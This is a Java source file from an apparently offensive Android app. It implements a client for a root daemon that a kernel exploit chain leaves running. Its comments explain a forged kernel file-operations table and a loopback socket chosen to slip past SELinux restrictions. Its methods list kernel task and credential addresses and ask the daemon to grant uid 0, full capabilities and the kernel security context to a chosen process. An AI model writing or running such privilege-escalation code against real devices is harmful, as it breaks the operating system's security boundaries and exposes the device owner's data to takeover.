package dev.ghostlock.mepan00;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.List;

/**
 * Client for the privileged io daemon that preload.so spawns once the exploit
 * chain has finished.
 *
 * The daemon keeps the ashmem fd whose f_op points at the forged configfs-backed
 * table, so it can do kernel memory I/O -- and, relevant here, hand out root.
 * It listens on loopback TCP on purpose: an untrusted_app is denied write on a
 * sock_file under /data/local/tmp, but connecting to 127.0.0.1 is allowed.
 *
 * Only the two ops this app needs are implemented:
 *   'T' -> task list   (pid, tgid, task, cred, comm[16]) * count
 *   'G' -> grant root to one task address
 *
 * One request per connection, matching the daemon.
 */
public final class RootChannel {

    public static final int PORT = 39555;
    private static final int CONNECT_TIMEOUT_MS = 3000;
    private static final int REC_SIZE = 40;      // pid,tgid,task,cred,comm[16]
    private static final int REC_MAGIC = 0x544b5243; // not used; sanity only

    public static final class Task {
        public final int pid, tgid;
        public final long task, cred;
        public final String comm;

        Task(int pid, int tgid, long task, long cred, String comm) {
            this.pid = pid; this.tgid = tgid; this.task = task;
            this.cred = cred; this.comm = comm;
        }
    }

    private RootChannel() {}

    private static Socket connect() throws IOException {
        Socket s = new Socket();
        s.connect(new InetSocketAddress("127.0.0.1", PORT), CONNECT_TIMEOUT_MS);
        s.setTcpNoDelay(true);
        return s;
    }

    /** True if the daemon is up (i.e. the exploit chain finished). */
    public static boolean ping() {
        try (Socket s = connect()) {
            OutputStream out = s.getOutputStream();
            out.write('P');
            out.flush();
            return s.getInputStream().read() == 'p';
        } catch (IOException e) {
            return false;
        }
    }

    /** Snapshot of every task the daemon can see, or null if unreachable. */
    public static List<Task> tasks() {
        try (Socket s = connect()) {
            OutputStream out = s.getOutputStream();
            out.write('T');
            out.flush();

            DataInputStream in = new DataInputStream(s.getInputStream());
            int count = readLe32(in);
            if (count <= 0 || count > 4096) return null;

            byte[] raw = new byte[count * REC_SIZE];
            in.readFully(raw);

            ByteBuffer bb = ByteBuffer.wrap(raw).order(ByteOrder.LITTLE_ENDIAN);
            List<Task> list = new ArrayList<>(count);
            for (int i = 0; i < count; i++) {
                int pid = bb.getInt();
                int tgid = bb.getInt();
                long task = bb.getLong();
                long cred = bb.getLong();
                byte[] c = new byte[16];
                bb.get(c);
                int end = 0;
                while (end < c.length && c[end] != 0) end++;
                list.add(new Task(pid, tgid, task, cred,
                        new String(c, 0, end, java.nio.charset.StandardCharsets.UTF_8)));
            }
            return list;
        } catch (IOException e) {
            return null;
        }
    }

    /** Grant root (uid 0 + full caps + kernel sid) to one task. */
    public static boolean grantRoot(long taskAddr) {
        try (Socket s = connect()) {
            OutputStream out = s.getOutputStream();
            ByteBuffer req = ByteBuffer.allocate(9).order(ByteOrder.LITTLE_ENDIAN);
            req.put((byte) 'G');
            req.putLong(taskAddr);
            out.write(req.array());
            out.flush();
            return s.getInputStream().read() == 1;
        } catch (IOException e) {
            return false;
        }
    }

    /**
     * Grant root to the task whose pid matches, looking through both pid and
     * tgid (threads of our process share the tgid).
     */
    public static boolean grantRootToPid(int pid) {
        List<Task> ts = tasks();
        if (ts == null) return false;
        for (Task t : ts) {
            if (t.pid == pid || t.tgid == pid) {
                return grantRoot(t.task);
            }
        }
        return false;
    }

    private static int readLe32(DataInputStream in) throws IOException {
        int b0 = in.read(), b1 = in.read(), b2 = in.read(), b3 = in.read();
        if ((b0 | b1 | b2 | b3) < 0) throw new IOException("short read");
        return b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
    }
}
